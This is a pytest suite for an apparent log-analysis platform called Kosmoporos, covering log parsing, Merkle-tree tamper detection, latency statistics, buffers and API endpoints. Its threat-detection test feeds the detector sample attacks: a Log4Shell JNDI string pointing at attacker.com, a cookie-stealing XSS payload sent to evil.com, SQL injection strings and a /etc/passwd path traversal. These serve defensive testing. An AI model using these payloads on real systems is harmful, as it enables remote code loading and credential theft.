"""
Unit & Integration Test Suite for Kosmoporos Core Functionalities:
- KosmoporosEngine: Autonomous pipeline coordination & batch parsing
- KosmoporosMerkleVault: 125-log block sealing, SHA-256 binary tree proofs & tamper detection
- ThreatDetector: Pre-compiled multi-vector exploit detection & IP blacklisting
- KosmoporosStatsEngine: P50/P95/P99 latency percentiles & rolling metrics
- Staging Buffers: MemoryQueueTempStorage & DiskSpoolTempStorage
"""

import os
import sys
import time
import pytest
from pathlib import Path

ROOT_DIR = Path(__file__).resolve().parent.parent.parent
MAIN_DIR = ROOT_DIR / "main"
for p in [str(MAIN_DIR), str(ROOT_DIR)]:
    if p not in sys.path:
        sys.path.insert(0, p)

from kosmoporos.engine import KosmoporosEngine
from kosmoporos.merkle.vault import KosmoporosMerkleVault, MerkleBlock
from kosmoporos.threat.threat_detector import ThreatDetector
from kosmoporos.stats.engine import KosmoporosStatsEngine
try:
    from app.storage.temp_storage import MemoryQueueTempStorage, DiskSpoolTempStorage  # type: ignore
    from app.pipeline import UlpfPipeline  # type: ignore
except ImportError:
    from app.storage.temp_storage import MemoryQueueTempStorage, DiskSpoolTempStorage  # type: ignore
    from app.pipeline import UlpfPipeline  # type: ignore


def test_kosmoporos_engine_basic_parsing():
    """Verify KosmoporosEngine can parse standard logs into CanonicalEvent."""
    engine = KosmoporosEngine()
    raw = "CEF:0|CheckPoint|VPN-1|1.0|100|Auth|3|src=192.168.1.50 dst=10.0.0.1 act=allow"
    res = engine.parse(raw)

    assert res.status == "success"
    assert res.format == "CEF"
    assert res.parser_used == "cef"
    assert res.canonical_event.source.ip == "192.168.1.50"
    assert res.canonical_event.destination.ip == "10.0.0.1"
    assert res.canonical_event.event.action == "allow"
    assert res.raw_sha256 != ""
    assert res.merkle_root is not None


def test_kosmoporos_engine_threat_detection():
    """Verify ThreatDetector identifies high-severity exploit signatures."""
    detector = ThreatDetector(blocked_ips={"198.51.100.99"})

    # Log4Shell
    v_jndi = detector.evaluate("${jndi:ldap://attacker.com/exploit}")
    assert v_jndi.is_threat is True
    assert "Log4Shell" in v_jndi.threat_type
    assert v_jndi.severity == "critical"
    assert v_jndi.score >= 10

    # SQL Injection
    v_sqli = detector.evaluate("SELECT * FROM users WHERE id = 1 UNION SELECT null, username, password FROM admin")
    assert v_sqli.is_threat is True
    assert "SQL Injection" in v_sqli.threat_type
    assert v_sqli.severity in ("high", "critical")

    # XSS
    v_xss = detector.evaluate("<script>document.location='http://evil.com/'+document.cookie</script>")
    assert v_xss.is_threat is True
    assert "XSS" in v_xss.threat_type

    # Path Traversal
    v_lfi = detector.evaluate("GET /view?page=../../../../etc/passwd HTTP/1.1")
    assert v_lfi.is_threat is True
    assert "Path Traversal" in v_lfi.threat_type

    # Blacklisted IP
    v_ip = detector.evaluate("Normal traffic", src_ip="198.51.100.99")
    assert v_ip.is_threat is True
    assert "Blocked IP" in v_ip.threat_type


def test_kosmoporos_merkle_vault_block_sealing():
    """Verify MerkleVault automatically seals at exactly 125 logs and verifies blocks."""
    vault = KosmoporosMerkleVault(block_size=125)

    # Ingest 250 logs -> Should create exactly 2 sealed blocks
    for i in range(250):
        vault.append_event(f"Syslog test payload event #{i} for cryptographic ledger.")

    metrics = vault.get_metrics()
    assert metrics["total_events"] == 250
    assert metrics["sealed_blocks_count"] == 2
    assert len(vault.blocks) == 2

    # Cryptographic integrity verification of both sealed blocks
    assert vault.verify_block(0) is True
    assert vault.verify_block(1) is True


def test_kosmoporos_merkle_vault_tamper_detection():
    """Verify MerkleVault detects any byte modification within a sealed block."""
    vault = KosmoporosMerkleVault(block_size=125)

    for i in range(125):
        vault.append_event(f"Unmodified forensic log record #{i}")

    assert vault.verify_block(0) is True

    # Simulate adversarial byte tamper inside the leaf hashes
    vault.blocks[0].leaf_hashes[10] = "deadbeef" * 8
    assert vault.verify_block(0) is False


def test_kosmoporos_stats_engine_percentiles():
    """Verify KosmoporosStatsEngine accurately tracks P50, P95, and P99 latencies."""
    stats = KosmoporosStatsEngine()

    # Record 100 events with known simulated latencies (10 to 1000 µs)
    for i in range(1, 101):
        stats.record_event(byte_len=100, latency_us=float(i * 10), format_name="CEF")

    snapshot = stats.get_snapshot()
    assert snapshot["total_events"] == 100
    assert snapshot["latency_p50_us"] == pytest.approx(500.0, abs=20.0)
    assert snapshot["latency_p95_us"] == pytest.approx(950.0, abs=20.0)
    assert snapshot["latency_p99_us"] == pytest.approx(990.0, abs=20.0)
    assert snapshot["format_distribution"]["CEF"] == 100


def test_staging_buffers_memory_and_disk(tmp_path):
    """Verify MemoryQueueTempStorage and DiskSpoolTempStorage decouple ingress safely."""
    # 1. Memory staging buffer
    mem_storage = MemoryQueueTempStorage(max_size=50)
    assert mem_storage.stage_raw_log("EID-1", "sample log 1") is True
    assert mem_storage.stage_raw_log("EID-2", "sample log 2") is True

    batch = mem_storage.fetch_next(batch_size=10)
    assert len(batch) == 2
    assert batch[0]["event_id"] == "EID-1"
    assert batch[1]["raw_payload"] == "sample log 2"

    # 2. Disk spool buffer
    disk_storage = DiskSpoolTempStorage(spool_dir=str(tmp_path / "spool"))
    assert disk_storage.stage_raw_log("EID-D1", "disk log 1") is True
    assert disk_storage.stage_raw_log("EID-D2", "disk log 2") is True

    disk_batch = disk_storage.fetch_next(batch_size=10)
    assert len(disk_batch) == 2
    assert disk_batch[0]["event_id"] == "EID-D1"


def test_ulpf_pipeline_kosmoporos_integration():
    """Verify UlpfPipeline transparently coordinates ThreatDetector and MerkleVault."""
    pipeline = UlpfPipeline()

    # Normal log
    ir_normal = pipeline.process("CEF:0|PaloAlto|PAN-OS|1.0|TRAFFIC|allow|1|src=10.1.1.1 dst=8.8.8.8")
    assert ir_normal.status == "success"
    assert ir_normal.unmapped.get("threat_verdict", {}).get("is_threat", False) is False
    assert "merkle_block_id" in ir_normal.unmapped

    # Threat log
    ir_threat = pipeline.process("<134>1 2026-09-25T12:00:00Z web.corp - - - GET /login?u=admin'-- HTTP/1.1")
    assert ir_threat.unmapped.get("threat_verdict", {}).get("is_threat", True) is True
    assert ir_threat.event.type is not None
    assert "SQL Injection" in ir_threat.event.type

    # Verify Merkle stats accessible from pipeline
    merkle_stats = pipeline.get_merkle_stats()
    assert merkle_stats["total_events"] >= 2
    assert "backend" in merkle_stats


def test_persistence_manager_imain_storage_unit():
    """Verify PersistenceManager implements IMainStorageUnit and supports both calling styles."""
    try:
        from app.storage.persistence import PersistenceManager  # type: ignore
        from app.storage.interfaces import IMainStorageUnit  # type: ignore
        from app.pipeline import UlpfPipeline  # type: ignore
    except ImportError:
        from app.storage.persistence import PersistenceManager  # type: ignore
        from app.storage.interfaces import IMainStorageUnit  # type: ignore
        from app.pipeline import UlpfPipeline  # type: ignore

    pm = PersistenceManager()
    assert isinstance(pm, IMainStorageUnit)

    pipeline = UlpfPipeline()
    ir = pipeline.process("CEF:0|Test|App|1.0|100|Login|1|src=10.0.0.10 dst=10.0.0.20")

    # Calling convention 1: ir_event
    rec1 = pm.persist_event(ir_event=ir, source="test_conv_1")
    assert rec1["event_id"] == ir.ulpf.event_id
    assert rec1["source"] == "test_conv_1"

    # Calling convention 2: canonical_event + raw_message + event_id
    eid2 = "ULPF-CUSTOM-TEST-999"
    rec2 = pm.persist_event(
        event_id=eid2,
        raw_message="<134>custom raw log message",
        canonical_event=ir,
        source="test_conv_2",
    )
    assert rec2["event_id"] == eid2
    assert rec2["source"] == "test_conv_2"
    assert rec2["raw_message"] == "<134>custom raw log message"


def test_kosmoporos_api_endpoints():
    """Verify Kosmoporos REST endpoints work as specified."""
    from fastapi.testclient import TestClient
    try:
        from app.main import app  # type: ignore
    except ImportError:
        from app.main import app  # type: ignore

    client = TestClient(app)

    # 1. GET /api/v1/kosmoporos/statistics
    r_stats = client.get("/api/v1/kosmoporos/statistics")
    assert r_stats.status_code == 200
    sdata = r_stats.json()
    assert "total_events" in sdata
    assert "merkle_vault" in sdata

    # 2. POST /api/v1/kosmoporos/parse-stored
    r_parse = client.post(
        "/api/v1/kosmoporos/parse-stored",
        json={"raw_log": "CEF:0|Vendor|Product|1.0|100|Event|Low|src=10.10.10.1 dst=10.10.10.2", "source": "spool_test"}
    )
    assert r_parse.status_code == 200
    pdata = r_parse.json()
    assert pdata.get("status") in ("success", "partial")

    # 3. GET /api/v1/kosmoporos/merkle/root
    r_root = client.get("/api/v1/kosmoporos/merkle/root")
    assert r_root.status_code == 200
    root_data = r_root.json()
    assert "merkle_root" in root_data
    assert len(root_data["merkle_root"]) == 64

    # 4. GET /api/v1/kosmoporos/merkle/verify/0
    r_verify = client.get("/api/v1/kosmoporos/merkle/verify/0")
    assert r_verify.status_code == 200
    vdata = r_verify.json()
    assert "integrity_verified" in vdata

